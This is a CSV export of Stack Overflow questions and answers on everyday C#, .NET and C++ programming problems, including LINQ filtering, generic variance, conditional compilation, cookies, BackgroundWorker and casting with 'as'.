"<p>I just ran into one of the most mind boggling errors ever.  false == true  What information would you guys need to confirm/debug this behavior?  I've never seen anything like it.</p>

<p><img src=""http://i.stack.imgur.com/eFqMq.png"" alt=""enter image description here""></p>

<ul>
<li><strong>VS2008 sp1</strong>   </li>
<li><strong>Debug Mode | Any Cpu</strong></li>
<li><strong>IIS 7.5</strong></li>
</ul>

<p>Edit:
I did a clean->rebuild and still the same.</p>

<p>Here's the assembly and registers. I don't know how to read this, but maybe it could help someone else.</p>
","33708","","<p>Probably the source does not correspond to the running version or there's a bug in the debugger.</p>
"
"<p>I have a stream of data which consists of 64-bit IEEE standard 754 floating point numbers. How would I read these as doubles in using C#? Is there a way to convert a long/ulong into a double?</p>
","33708","","<p><a href=""http://msdn.microsoft.com/en-us/library/system.bitconverter.int64bitstodouble%28VS.71%29.aspx"" rel=""nofollow""><code>BitConverter.Int64BitsToDouble</code> method</a> is specifically designed to do this. Alternatively, you can use a <code>BinaryReader</code> on top of the stream and take <code>double</code> values directly with its <code>ReadDouble</code> method.</p>

<pre><code>double doubleValue = BitConverter.Int64BitsToDouble(longValue);
</code></pre>
"
"<p>I have to hide the VIEWSTATE and EVENTVALIDATION hidden fields on my ASP.net page at RUN time.</p>

<p>I managed to remove the EVENTVALIDATION like so.............</p>

<pre><code>&lt;%@ Page enableEventValidation=""false"" EnableViewState=""false"" %&gt;
</code></pre>

<p>But the VIEWSTATE is still there and I cant get rid of it and I need to. (hard to explain why)</p>

<p>Is there another way of getting rid of it?</p>

<p>Thanks in advanced!</p>
","33708","","<p>To remove the <code>__VIEWSTATE</code> altogether, you'll need to get rid of the <code>&lt;form runat=""server""&gt;</code> tag. Of course, you won't be able to use controls that require rendering in a server form.</p>
"
"<p>I came to know that using Reflection we can create objects without using ""new"" keyword. So I wanted to know are there any differences in them or any particular scenarios to use Reflection. Because till now i didnt create or seen any of the code creating object with reflection. </p>

<p>Why using 'new' became so used and reflection not.</p>
","33708","","<p>You'd use reflection only when you want to instantiate a type you based on its name (a string) or a type that you don't have access at compile time (e.g. a plugin). You wouldn't want to use it in place of <code>new</code> to instantiate types in normal conditions.</p>
"
"<p>In Solution properties, I have Configuration set to ""release"" for my one and only project. </p>

<p>At the beginning of the main routine, I have this code, and it is showing ""Mode=Debug"". 
I also have these two lines at the very top: </p>

<pre><code>#define DEBUG 
#define RELEASE
</code></pre>

<p>Am I testing the right variable? </p>

<pre><code>#if (DEBUG)
            Console.WriteLine(""Mode=Debug""); 
#elif (RELEASE)
            Console.WriteLine(""Mode=Release""); 
#endif
</code></pre>

<p>My goal is to set different defaults for variables based on debug vs release mode. </p>
","33708","","<p>By default, Visual Studio defines DEBUG if project is compiled in Debug mode and doesn't define it if it's in Release mode. RELEASE is not defined in Release mode by default. Use something like this:</p>

<pre><code>#if DEBUG
  // debug stuff goes here
#else
  // release stuff goes here
#endif
</code></pre>

<p>If you want to do something only in release mode:</p>

<pre><code>#if !DEBUG
  // release...
#endif
</code></pre>

<p>Also, it's worth pointing out that you can use <code>[Conditional(""DEBUG"")]</code> attribute on methods that return <code>void</code> to have them only executed if a certain symbol is defined. The compiler would remove all calls to those methods if the symbol is not defined:</p>

<pre><code>[Conditional(""DEBUG"")]
void PrintLog() {
    Console.WriteLine(""Debug info"");
}

void Test() {
    PrintLog();
}
</code></pre>
"
"<p>I've just run into what I think is an oddity in type-casting. I have code similar to the following:</p>

<pre><code>interface IMyClass { }

class MyClass: IMyClass { }

class Main
{
  void DoSomething(ICollection&lt;IMyClass&gt; theParameter) { }

  HashSet&lt;MyClass&gt; FillMyClassSet()
  {
    //Do stuff
  }

  void Main()
  {
    HashSet&lt;MyClass&gt; classSet = FillMyClassSet();
    DoSomething(classSet);
  }
}
</code></pre>

<p>When it gets to DoSomething(classSet), the compiler complains that it can't cast HashSet&lt;MyClass&gt; to ICollection&lt;IMyClass&gt;. Why is that? HashSet implements ICollection, MyClass implements IMyClass, so why isn't the cast valid?</p>

<p>Incidentally this isn't hard to work around, thought it's slightly awkward.</p>

<pre><code>void Main()
{
  HashSet&lt;MyClass&gt; classSet = FillMyClassSet();
  HashSet&lt;IMyClass&gt; interfaceSet = new HashSet&lt;IMyClass&gt;();
  foreach(IMyClass item in classSet)
  {
    interfaceSet.Add(item);
  }
  DoSomething(interfaceSet);
}
</code></pre>

<p>To me, the fact that this works makes the inability to cast even more mysterious.</p>
","33708","","<p>It won't work because all instances of <code>MyClass</code> being <code>IMyClass</code> doesn't automatically imply that all instances of <code>HashSet&lt;MyClass&gt;</code> are also <code>HashSet&lt;IMyClass&gt;</code>. If it worked, you could:</p>

<pre><code>ICollection&lt;IMyClass&gt; h = new HashSet&lt;MyClass&gt;();
h.Add(new OtherClassThatImplementsIMyClass()); // BOOM!
</code></pre>

<p>Technically, it doesn't work because C# (&lt;= 3.0) generics are invariant. C# 4.0 introduces safe-covariance, which doesn't help in this case either. It does, however, help when interfaces use the type parameters only in input or only in output positions. For instance, you'll be able to pass a <code>HashSet&lt;MyClass&gt;</code> as an <code>IEnumerable&lt;IMyClass&gt;</code> to some method.</p>

<p>By the way, they are easier workarounds than manually filling another <code>HashSet</code> like:</p>

<pre><code>var newSet = new HashSet&lt;IMyClass&gt;(originalSet);
</code></pre>

<p>or you can use the <code>Cast</code> method if you want to cast a set to an <code>IEnumerable&lt;IMyClass&gt;</code>:</p>

<pre><code>IEnumerable&lt;IMyClass&gt; sequence = set.Cast&lt;IMyClass&gt;(set);
</code></pre>
"
"<p>Is there a case where pass-by-reference is more expensive than pass-by-value in C++? If so, what would that case be?</p>
","33708","","<p>Yes, accessing a passed by reference argument might require more levels of indirection than a passed by value argument. Besides, it's may to be slower if the size of the argument is smaller than the size of a single pointer. Of course, it's all assuming the compiler is not optimizing it.</p>
"
"<p>I would like to override the .ToString() function so that whenever I get a double
it outputs only 5 digits after the decimal point.</p>

<p>How do I reffer to the object the .ToString is working on, inside the override function?
In other words what shell I put instead of the XXX in the following code?</p>

<pre><code>public override string ToString()
{
    if (XXX.GetType().Name == ""Double"")
        return (Math.Round(XXX, 5));
}
</code></pre>
","33708","","<p>As Jon pointed out, you can't override <code>Double.ToString</code>. You can create an extension method for <code>double</code> type that helps you do this:</p>

<pre><code>public static class DoubleExtensions {
   public static string ToStringWith5Digits(this double x) { ... }
}
</code></pre>

<p>and use it like:</p>

<pre><code>double d = 10;
string x = d.ToStringWith5Digits(); 
</code></pre>
"
"<p>i am a java programmer and i know in java objects are stored on heap. Just for curiosity wanted to where does objects reside in c#. </p>
","33708","","<p>The C# language doesn't specify where an object or a value should be stored. It simply defines the semantics of reference types and value types. </p>

<p>Microsoft .NET CLR stores values (instances of value types) contained of local variables on stack and instances of reference types (objects) and non-local value types on the heap. However, as stated previously, other implementations of the C# language are free to store things as they wish as long as they conform to value and reference semantics defined by the C# Language Specification.</p>
"
"<p>I'm trying to find the best approach to filtering a list with C# (3.5) but I can't seem to find any examples that are similar to my situation.  I'm open to using lambdas or linq. </p>

<p>The thing that is unique compared to most of the examples that I've found, is that my list items each have child arrays for example...</p>

<pre><code>var employees= new List&lt;Employee&gt;
{
    new Employee{Name = ""John"",Nicknames=""'J','Big J','Big John'""},
    new Employee{Name = ""Joshua"",Nicknames=""'J','Josh','Joshman'""},
}
</code></pre>

<p>I'd then like to filter that list something like this...</p>

<pre><code>//using linq
var matchesByNickname =
from worker in employees
where worker.Nicknames.Equals(""J"")
select worker;

//or lambda
var employees2 = employees
    .Where(e =&gt; Nicknames.Exists(n =&gt; n.Nickname == ""J""))
</code></pre>

<p>But of course since Nicknames is itself an array I cannot use .Equals or .Contains etc.  What would be the best approach to filtering a list of this type?</p>

<p>UPDATE:
In trying to keep my example simple I've misled you a bit.  The list items do have true object arrays on them, not strings.  My real world example is a list of custom product objects.  The product object has a Regions property on it which is a list of Region objects.  A product can have none, 1, or more than 1 region.  The region object has a name and an id.
So what I really want is to filter a list of products, for any product assigned to a certain region.</p>
","33708","","<p>In your example, <code>Nickname</code> is not an array as I see it. It's a string. Assuming it's an array of strings, you could:</p>

<pre><code>var employees2 = employees.Where(e =&gt; e.Nicknames.Contains(name));
</code></pre>

<p>If you want to keep it as is (string), you can try something along the lines of:</p>

<pre><code>var employees2 = employees.Where(e =&gt; e.Nicknames.Split(',')
                                                 .Contains(""'"" + name + ""'""));
</code></pre>

<p>In both of the cases above, you can replace <code>Where</code> with <code>FindAll</code> and get results back in a <code>List&lt;T&gt;</code> instead of an <code>IEnumerable&lt;T&gt;</code> (<code>List&lt;T&gt;.FindAll</code> has been around since 2.0 but <code>Enumerable.Where</code> is new in 3.5). </p>

<p>Of course, ideally, you'll make it an array or list like the following and use the first method:</p>

<pre><code>var employees = new List&lt;Employee&gt;
{
    new Employee{Name = ""John"",Nicknames= new [] {""J"", ""Big J"", ""Big John""}},
    new Employee{Name = ""Joshua"",Nicknames = new [] {""J"", ""Josh"", ""Joshman""}},
};
</code></pre>

<p><strong>UPDATE</strong>: Your real world example is not so much different from this sample case. I <em>think</em> you're looking for <code>Any</code> instead of <code>Contains</code> since you are checking a property, not the whole object for equality:</p>

<pre><code>var filteredProducts = products
        .Where(p =&gt; p.Regions.Any(r =&gt; r.Name == ""regionToSearchFor""));
</code></pre>
"
"<p>When I read code that uses <code>Select</code> I think ""select-all-where"".
When I read code that uses <code>Map</code> I think ""this-to-that"" or ""apply-to-all"".
I can't be the only person that feels the name <code>Select</code> is confusing.</p>

<p><a href=""http://en.wikipedia.org/wiki/Map_%28higher-order_function%29"">Map</a></p>
","33708","","<p>It's really identical to map from functional languages. The reason it's named <code>Select</code> is that it's designed to be used as a part of LINQ which uses SQL-like keywords. </p>

<pre><code>from item in collection
where item.Value == someValue
select item.Name
</code></pre>

<p>is translated to:</p>

<pre><code>collection.Where(item =&gt; item.Value == someValue)
          .Select(item =&gt; item.Name)
</code></pre>

<p>it would be a little inconsistent if <code>Select</code> was named <code>Map</code>; something like:</p>

<pre><code>collection.Filter(item =&gt; item.Value == someValue)
          .Map(item =&gt; item.Name)
</code></pre>

<p>In fact, many people use LINQ without having heard of functional programming at all. To them, LINQ is a method to retrieve data objects and query them easily (like SQL queries are). To them, <code>Select</code> and <code>Where</code> make perfect sense. Much more than <code>Map</code> and <code>Filter</code>.</p>
"
"<p>how can we add a where condition to a linq subselect query.</p>

<p>i.e.</p>

<pre><code>List&lt;CallLog&gt; callLog = CallLog.SampleData();
List&lt;Contacts&gt; contacts = Contacts.SampleData();


var q = from call in callLog
        where call.Incoming == true
        group call by call.Number into g
        select new contacts { 
                              contact.FirstName = g.FirstName, 
                              contact.LastName = g.LastName, 
                             Count = g.Count(), 
                             Avg = g.Average( c =&gt; c.Duration ) &lt;--- WHERE c.Duration &gt; 5, 
                             Total = g.Sum( c =&gt; c.Duration )   &lt;--- WHERE c.Duration &gt;= 60
                            };
</code></pre>

<p>How can we add a ""Where condition"" to the LINQ statement as shown above?</p>
","33708","","<p>Simply add a <code>Where</code> method with the clause you described!  </p>

<pre><code>Avg   = g.Where(c =&gt; c.Duration &gt; 5).Average(c =&gt; c.Duration), 
Total = g.Where(c =&gt; c.Duration &gt;= 60).Sum(c =&gt; c.Duration)
</code></pre>
"
"<p>It's been a few years since I've done web services. I remember it to be fairly simply to create and consume one. In my current position, I work in a large organization and we use a lot of DB2 stored procedures the mainframe guy write for us to get at HR data. </p>

<p>I'm now starting on a new HR project and rather than having the same ol' data access code that is in most of our other HR apps, I suggested we write a code library DLL that did all this work and just use this DLL in our HR apps from here on out. Once I suggested this, my manager thinks this is a great idea, but he wants it done in web services. </p>

<p>My manager has now tasked me with researching options for securing these web services would be. He wants me to tell him if we should use WCF with this and if the Java developers in the organization will be able to use the web services I create. </p>

<p>I have done quite a few web searches and haven't found information that specifically answers these questions. Is there anyone here with experience in doing this and could answer the qeustions regarding the security, WCF (which I know little about), and interoperability with other platforms (Java)?</p>

<p>Thanks!</p>
","33708","","<p>WCF is the current approach for building service end points in .NET apps. It's flexible in supporting different transport channels and protocols. You can certainly expose SOAP Web Services from WCF and use them from Java clients or anything else that supports XML.</p>

<p>The old way of doing that in .NET, simple ASMX Web services is deprecated in favor of WCF. It doesn't have all the bells and whistles of WCF but it's very simple to use. Personally, I still like it and use it in very simple Web services where WCF is an overkill.</p>
"
"<p>This is more a general purpose programming question than language specific. I've seen several appraoches to try and catches.</p>

<p>One is you do whatever preprocessing on data you need, call a function with the appropriate arguments and wrap it into a try/catch block.</p>

<p>The other is to simply call a function pass the data and rely on try catches within the function, with the function returning a true/false flag if errors occured.</p>

<p>Third is a combination with a try catch outside the function and inside. However if the functions try catch catches something, it throws out another exception for the try catch block outside the function to catch.</p>

<p>Any thoughts on the pros/cons of these methods for error control or if there is an accepted standard? My googling ninja skills have failed me on finding accurate data on this.</p>
","33708","","<p>Every ""module"" in an application is responsible for handling its own input parameters. Normally, you should find issues as soon as possible and not hand garbage to another part of the application and rely on them to be correct. There are exceptions though. Sometimes validating an input parameter basically needs reimplementing what the callee is supposed to do (e.g. parsing an integer) in the caller. In this case, it's usually appropriate to try the operation and see if it works or not. Moreover, there are some operations that you can't predict their success without doing them. For example, you can't reliably check if you can write to a file before writing to it: another process might immediately lock the file after your check. </p>
"
"<p>I can't figure out why the following code doesn't compile. The syntax is the same as my other operator overloads. Is there a restriction that the &lt;&lt; overload must be friended? If so, why? Thanks for any help.</p>

<p>This doesn't work - </p>

<pre><code>#include ""stdafx.h""
#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;string&gt;

class Test
{
 public:
explicit Test(int var):
    m_Var(var)
    {   }

    std::ostream&amp; operator&lt;&lt; (std::ostream&amp; stream)
    {
        return stream &lt;&lt; m_Var;
    }
 private:
int m_Var;

 };

 int _tmain(int argc, _TCHAR* argv[])
 {
Test temp(5);

std::cout &lt;&lt; temp;

return 0;
}
</code></pre>

<p>This does work - </p>

<pre><code>#include ""stdafx.h""
#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;string&gt;

class Test
{
public:
explicit Test(int var):
    m_Var(var)
    {   }

    friend std::ostream&amp; operator&lt;&lt; (std::ostream&amp; stream, Test&amp; temp);

private:
    int m_Var;

 };

 std::ostream&amp; operator&lt;&lt; (std::ostream&amp; stream, Test&amp; temp)
 {
return stream &lt;&lt; temp.m_Var;
 };

 int _tmain(int argc, _TCHAR* argv[])
 {
Test temp(5);

std::cout &lt;&lt; temp;

return 0;
 }
</code></pre>
","33708","","<p>It's not a restriction that any operator must be ""<code>friend</code>ed"". The problem is that, if you declare an operator as an instance method, the first argument is always forced to be the type of the class itself. In this case, you need the first parameter of the operator (left hand side) to be of type <code>std::ostream&amp;</code> therefore, you can't use an instance method to overload it and will have to use a global function.</p>

<p>By the way, it's not at all required that operators declared as separate functions to be declared as <code>friend</code> functions too. They can happily work without being a <code>friend</code> of the class as long as they only access <code>public</code> members of their arguments. </p>
"
"<p>I have a <code>List&lt;MyStruct&gt;</code> that I'm initializing to be empty, and I will be populating this struct in a loop as I parse the data. I know that there is a maximum possible number of entries that will be inserted into this list. For now lets say 1000. However after my parsing of the 1000 entries I may end up only putting 2 into the List. So should I initialize the List with a capacity of 1000 or don't specify a capacity and just add the few entries. It could however end up adding all 1000. What's the best way performance wise?</p>
","33708","","<p>Doesn't really matter. Don't micro-optimize. Only set the capacity if you have a good idea it's roughly the amount you need. Under the hood, the list doubles every time it grows, so the number of growths is <code>O(log(n))</code>. It should be pretty efficient.</p>
"
"<p>Is there any way to tell if a visitor to a site is new, or just the same one over and over again, for the purpose of a hit counter? </p>

<p>Sessions don't really seem to exist in MVC, so I know I can't really use them...</p>
","33708","","<blockquote>
  <p>Is there any way to tell if a visitor to a site is new, or just the same one over and over again, for the purpose of a hit counter?</p>
</blockquote>

<p>There's not a 100% reliable way due to the stateless nature of the web but for the purposes of a counter, setting a cookie and checking whether it's there or not is adequate for the most cases. </p>

<blockquote>
  <p>Sessions don't really seem to exist in MVC, so I know I can't really use them...</p>
</blockquote>

<p>This is not true. You can use <code>Session</code> in ASP.NET MVC too. Although, in general, you should avoid server-side state as much as possible when you don't need it to ease scalability. </p>
"
"<p>If I go to Project -> Myproject Properties -> Settings I can create a settings file for the entire project.  However supposed each class requires its own configuration file.  Is there a similar way to do this at the class level?</p>

<p>By way of example suppose I have a parent class Car with subclasses Ford and Honda.  I want to have a single property YEAR and a single piece of code for reading the YEAR property.  I could do this by having two configuration files with the same YEAR property.  If I used Ford.YEAR and Honda.YEAR than I would need two separate pieces of code for parsing the data which could get messy for a large number of classes.</p>
","33708","","<p>Configuration data is stored for an executable in its config file (which is a single file, regardless of the number of ""settings"" files in your project) and is not class-specific. You can set naming conventions for your setting keys configuration options related to a class like <code>ClassName.ConfigName</code>.</p>
"
"<p>consider this, If one is  user of a Web application</p>

<p>like : </p>

<p><strong>A</strong> someone visits SomeWebSite.com as a normal User (registered)</p>

<pre><code>HttpCookie cookie = new HttpCookie(""LastVisit"");
cookie.Value = DateTime.Now.ToString();
cookie.Expires = DateTime.Now.AddDays(1);
Response.Cookies.Add(cookie);
</code></pre>

<p><strong>B</strong> visits SomeWebSite.com, using another account as a moderator / admin</p>

<pre><code>HttpCookie cookie = new HttpCookie(""LastVisit"");
cookie.Value = DateTime.Now.ToString();
cookie.Expires = DateTime.Now.AddDays(1);
Response.Cookies.Add(cookie);
</code></pre>

<p>Both cookies belong to same domain, but for two different Accounts. How does browser know Which cookie belongs to which account ? if we use the following code to access it.</p>

<pre><code>if (Request.Cookies[""LastVisit""] != null)
    {
       string lastTimeUserVisited = Request.Cookies[""LastVisit""].Value;
    }
</code></pre>

<p><strong>EDIT:</strong> It's my first time ever to work on cookies. </p>

<p>I do appreciate your patience</p>
","33708","","<p>I don't quite understand the question. A single browsing session won't distinguish between the two cookies.  The last cookie that the server sets replaces the previous ones.  Obviously, two instances of Chrome running on two different computers don't share cookies and each send their own instance of the cookie to the server in every request.</p>
"
"<p>The C# scripting environement in Unity3D (runned under Mono) has a nice behavior when detroying objects. All the references that point to the destroyed object gets automaticly null :</p>

<pre><code>    GameObject ref1 = (GameObject)Instantiate(obj);
    GameObject ref2 = ref1;

    if (ref1 != null)
        Debug.Log(""ref1 is not null"");

    DestroyImmediate(ref1);

    if (ref1 == null)
        Debug.Log(""ref1 is null"");

    if (ref2 == null)
        Debug.Log(""ref2 is null"");    
</code></pre>

<p>Output :</p>

<pre><code>    ref1 is not null
    ref1 is null
    ref2 is null
</code></pre>

<p>Any ideas on how to acheive this ?</p>

<p>Thanks</p>
","33708","","<p>You can't do this in C# with call by value parameters. You'll have to use <code>ref</code> parameters which require <code>ref</code> keyword at call site too.</p>

<p>In fact, there's no useful notion of a reachable but destroyed (i.e. deallocated) managed object in .NET (well, ignoring <code>WeakReference</code> which doesn't really count). Either the object is not reachable or it can't be destroyed.</p>
"
"<pre><code>  char * oldname = new char[strlen(name) + 1];

  memcpy(oldname,name,strlen(name) + 1);

  name = new char[strlen(oldname) + strlen(r.name) + 1];
  memset(name, '\0', strlen(name));

  strcat(name,oldname);
  strcat(name,"" "");
  strcat(name,r.name);
</code></pre>

<p>I understand that it is a no no to use memcpy and memset but I haven't understood exactly how to use this in C++, preferably without std.</p>

<p>Does anyone know? Thank you.</p>
","33708","","<blockquote>
  <p>I understand that it is a no no to use memcpy and memset but I haven't understood exactly how to use this in C++, preferably without std.</p>
</blockquote>

<p>It's not a no-no to use <code>memcpy</code> and <code>memset</code> when their use is appropriate. Why should it be? </p>

<p>There's <code>std::copy</code> in C++ that copies a set of items (works on any type and not just <code>char*</code>) from an iterator to another. </p>
"
"<p>How would I convert this code to have n nested for loops:</p>

<pre><code>            int num = 4;

            for (int i = 0; i &lt;= num; i++)
            {
                for (int j = 0; j + i &lt;= num; j++)
                {
                    for (int k = 0; i + j + k &lt;= num; k++)
                    {
                        for (int l = 0; i + j + k + l &lt;= num; l++)
                        {
                            Console.WriteLine(i + "" "" + j + "" "" + k + "" "" + l);
                        }
                    }
                }
            }
</code></pre>

<p>So if num is 2 then there would only be 2 for loops; i and j.</p>

<p>This is NOT homework and I was hoping to do it iteratively.  Each Console.WriteLine() needs to be stored as like an element all together.</p>

<p>The output of this programs creates n dimensional hyperspase exponents.</p>
","33708","","<p>Normally, you'd use recursion for scenarios where you have nested loops where the number of nested loops is unknown at compile time. Something with the idea of:</p>

<pre><code>void func(const vector&lt;int&gt; &amp;times, int depth) {
    if (depth == times.size()) return;
    for (int i = 0; i &lt; times[depth]; ++i) {
        cout &lt;&lt; depth;
        func(times, depth + 1);
    }
}
</code></pre>
"
"<p>Well, as we all know, you can decompile C# (dll) assemblies to find what code lays inside of them. What I do not know, is how i can hide that code.</p>

<p>The issue: I'd like to release some dll's that will add extra functionality to applications, but i thats all i want them to be used for. adding functionality to applications. I dont want others knowing the real source code behind it.</p>

<p>Let me know if its possible to do that. Thanks!</p>
","33708","","<p>It's theoretically impossible to achieve 100% protection unless you control the target hardware. If the CPU is able to execute it, given enough time and knowledge, a human being can read it too. This is not even limited to C# (although it's usually <em>easier</em> to do in managed languages). You can use an obfuscator like Dotfuscator or XenoCode to make it harder to understand the decompiled code. If you're really concerned, you should move to a server-based application.</p>
"
"<p>I know HTTPRequest and Response are available, but I am looking for a HTTP component/class wrapper that I can plug straight into code with less hassle.</p>

<p>Are there any free or paid components/classes like this?</p>
","33708","","<p>It's unclear to me what exactly you are trying to accomplish. I think you want to download URLs via HTTP protocol. If that's true, I doubt you'll find anything easier to use than the built-in <a href=""http://msdn.microsoft.com/en-us/library/system.net.webclient.aspx"" rel=""nofollow""><code>System.Net.WebClient</code> class</a> since using it is a single line of code:</p>

<pre><code>string html = new WebClient().DownloadString(url);
byte[] data = new WebClient().DownloadData(url);
</code></pre>

<p>If you need to display a Web page in a Windows Forms application, you can use the WebBrowser control.</p>
"
"<p>I have a C# dictionary, <code>Dictionary&lt;Guid, MyObject&gt;</code> that I need to be filtered based on a property of <code>MyObject</code>.</p>

<p>For example, I want to remove all records from the dictionary where <code>MyObject.BooleanProperty = false</code>. What is the best way of acheiving this?</p>
","33708","","<p>If you don't care about creating a new dictionary with the desired items and throwing away the old one, simply try:</p>

<pre><code>dic = dic.Where(i =&gt; i.Value.BooleanProperty)
         .ToDictionary(i =&gt; i.Key, i =&gt; i.Value);
</code></pre>

<p>If you can't create a new dictionary and need to alter the old one for some reason (like when it's externally referenced and you can't update all the references:</p>

<pre><code>foreach (var item in dic.Where(item =&gt; !item.Value.BooleanProperty).ToList())
    dic.Remove(item.Key);
</code></pre>

<p>Note that <code>ToList</code> is necessary here since you're modifying the underlying collection. If you change the underlying collection, the enumerator working on it to query the values will be unusable and will throw an exception in the next loop iteration. <code>ToList</code> caches the values before altering the dictionary at all.</p>
"
"<p>I'm working on a Silverlight 2/3 application. I would like to use List.RemoveAll (or maybe it's IList.RemoveAll?) and specify a predicate so that I can remove a bunch of elements from a list in one sweep.</p>

<p>It seems like this function doesn't exist in Silverlight, though. Am I missing something here? Is there an alternative approach that's equally easy?  Right now, I'm manually iterating over my elements in a foreach and keeping a second list (because you can't delete while iterating), and it's quite ... cumbersome.</p>
","33708","","<p>You can use LINQ like:</p>

<pre><code>list = list.Where(predicate).ToList();
</code></pre>

<p>The alternative approach is to remove the elements in a for loop:</p>

<pre><code>for (int i = list.Count - 1; i &gt;= 0; --i)
    if (predicate(list[i])) 
         list.RemoveAt(i);
</code></pre>
"
"<p>I'm using Visual Basic 2008EE and I have a problem with this loop:</p>

<pre><code>If x = CType(""new"", Primitive) Then
        TextWindow.Write(""How many new users would you like to add?     "")
        k = TextWindow.ReadNumber()
        For mt = 1 To k
            NewUserEntry()
        Next
</code></pre>

<p>and i get this error:</p>

<pre><code>""type of 'mt' is ambigious because the loop bounds and the step clause do not convert to the same type""
</code></pre>

<p>I appreciate any help.</p>
","33708","","<p>The return type of <code>ReadNumber</code> (or more accurately, the type of <code>k</code> variable) is probably not an <code>Integer</code>. When the compiler wants to infer the type of the <code>mt</code>, it fails since <code>k</code>, which is specified as the loop bound has one type (probably something like <code>Double</code>) and the loop step (implicitly the integer constant 1) has the type <code>Integer</code>. The compiler will not automatically assume the type of <code>mt</code> since the two don't match. </p>

<pre><code>For mt As Integer = 1 To k
     NewUserEntry()
Next
</code></pre>
"
"<p>Is there a known reason why <code>FormatException</code> does not inherit from <code>ArgumentException</code>? An invalid format would seem to be a very specific case of an argument being invalid, similar to <code>ArgumentOutOfRangeException</code>. </p>

<p>The <a href=""http://msdn.microsoft.com/en-us/library/system.formatexception.aspx"" rel=""nofollow"">MSDN article for the class</a> states:</p>

<blockquote>
  <p><strong>FormatException</strong> is thrown when the format of an argument in a method invocation does not match the format of the corresponding formal parameter type. For example, if a method specifies a <code>String</code> parameter consisting of two digits with an embedded period, passing a corresponding string argument containing only two digits to that method would cause <strong>FormatException</strong> to be thrown.</p>
</blockquote>

<p>Sounds like just the scenario for an <code>ArgumentException</code> or deriving class to me. </p>

<p>All this means is that you can't deal with <code>FormatException</code> under the larger <code>ArgumentException</code> exception family, nor can you identify which parameter caused the exception to be thrown.</p>

<p>Is there any reason for this seemingly out-of-place exception to be where it is?</p>
","33708","","<p><code>FormatException</code> is not necessarily thrown when a formal argument of a method is invalid. It can also happen if the method is consuming an external resource and the format of the data from the external resource is inappropriate.  </p>

<p>For example, <a href=""http://msdn.microsoft.com/en-us/library/system.io.binaryreader.read7bitencodedint.aspx"" rel=""nofollow""><code>BinaryReader.Read7BitEncodedInt</code></a>  will throw <code>FormatException</code> if what it's going to read from a stream is not a valid 7-bit encoded integer. It doesn't take any arguments at all. <code>ArgumentException</code>, on the other hand, should only get thrown when an argument passed as a formal parameter to a method is invalid. </p>

<p>The description you referenced from the MSDN article is more restrictive than <code>FormatException</code> really is and should be clarified.</p>
"
"<p>I currently have a program that runs several ""intense"" queries. I added a textbox and presented status updates when a query was starting, eding and how many were left. This would suite my need, but the textbox doesn't actually display anything until all the queries are finished. It then displays all the updates at once. I'm assuming updating the textbox in another thread would solve this issue, and that is where I am lost. How can I use a thread that receives a message from the main form running the query and have it display it in the textbox?</p>
","33708","","<p>The <a href=""http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx""><code>BackgroundWorker</code> component</a> suits your need (sample code is there in the MSDN link). You handle its <code>DoWork</code> event and perform the actual query in it. You report the progress by calling its <code>ReportProgress</code> method. To display the reported progress, you should handle its <code>ProgressChanged</code> event and update the UI. You start the job by calling the <code>RunWorkerAsync</code> method of the background worker. Using <code>BackgroundWorker</code> relieves you from manually starting and stopping threads and communicating with the UI thread to update the progress bar.</p>
"
"<p>I end up with a lot of code like this:</p>

<pre><code>List&lt;string&gt; dates = someMethodCall();
foreach (string dateStr in dates) { }
</code></pre>

<p>I usually declare the object over which I'm iterating and then use it in the <code>foreach</code> condition out of worry that <code>someMethodCall()</code> would happen for each iteration of the loop.  Is this the case?  I would prefer to do this:</p>

<pre><code>foreach (string dateStr in someMethodCall()) { }
</code></pre>

<p>But I only want to do that if <code>someMethodCall()</code> happens only once and then its results are cached for each subsequent iteration.</p>
","33708","","<p>The method will be called only once in both cases.</p>

<p>The first method has a readability advantage as you can name the variable and describe what's in it with its name. It will make the code more self-documenting and improves maintainability.</p>

<hr>

<p>To quote the authoritative source on this:</p>

<blockquote>
  <h3>C# Language Specification - 8.8.4 The <code>foreach</code> statement</h3>

<pre><code> foreach (V v in x) embedded-statement
</code></pre>
  
  <p>is then expanded to:</p>

<pre><code>{
  E e = ((C)(x)).GetEnumerator();
  try {
  V v;
      while (e.MoveNext()) {
          v = (V)(T)e.Current;
          embedded-statement
      }
  }
  finally {
      â¦ // Dispose e
  }
}
</code></pre>
</blockquote>

<p>It's clear that the expression <code>x</code> in the above <code>foreach</code> statement is evaluated only once in the expansion.</p>
"
"<p>In development blogs, online code examples and (recently) even a book, I keep stumbling about code like this:</p>

<pre><code>var y = x as T;
y.SomeMethod();
</code></pre>

<p>or, even worse:</p>

<pre><code>(x as T).SomeMethod();
</code></pre>

<p>That doesn't make sense to me. If you are sure that <code>x</code> is of type <code>T</code>, you should use a direct cast: <code>(T)x</code>. If you are not sure, you can use <code>as</code> but need to check for <code>null</code> before performing some operation. All that the above code does is to turn a (useful) <code>InvalidCastException</code> into a (useless) <code>NullReferenceException</code>.</p>

<p>Am I the only one who thinks that this a blatant abuse of the <code>as</code> keyword? Or did I miss something obvious and the above pattern actually makes sense?</p>
","33708","","<p>Your understanding is true. That sounds like trying to micro-optimize to me. You should use a normal cast when you are sure of the type. Besides generating a more sensible exception, it also fails fast. If you're wrong about your assumption about the type, your program will fail immediately and you'll be able to see the cause of failure immediately rather than waiting for a <code>NullReferenceException</code> or <code>ArgumentNullException</code> or even a logical error sometime in the future. In general, an <code>as</code> expression that's not followed by a <code>null</code> check somewhere is a code smell.</p>

<p>On the other hand, if you are not sure about the cast and expect it to fail, you should use <code>as</code> instead of a normal cast wrapped with a <code>try-catch</code> block. Moreover, use of <code>as</code> is recommended over a type check followed by a cast. Instead of:</p>

<pre><code>if (x is SomeType)
   ((SomeType)x).SomeMethod();
</code></pre>

<p>which generates an <a href=""http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes.isinst.aspx""><code>isinst</code> instruction</a> for the <code>is</code> keyword, and a <a href=""http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes.castclass.aspx""><code>castclass</code> instruction</a> for the cast (effectively performing the cast twice), you should use:</p>

<pre><code>var v = x as SomeType;
if (v != null)
    v.SomeMethod();
</code></pre>

<p>This only generates an <code>isinst</code> instruction. The former method has a potential flaw in multithreaded applications as a race condition might cause the variable to change its type after the <code>is</code> check succeeded and fail at the cast line. The latter method is not prone to this error.</p>

<hr>

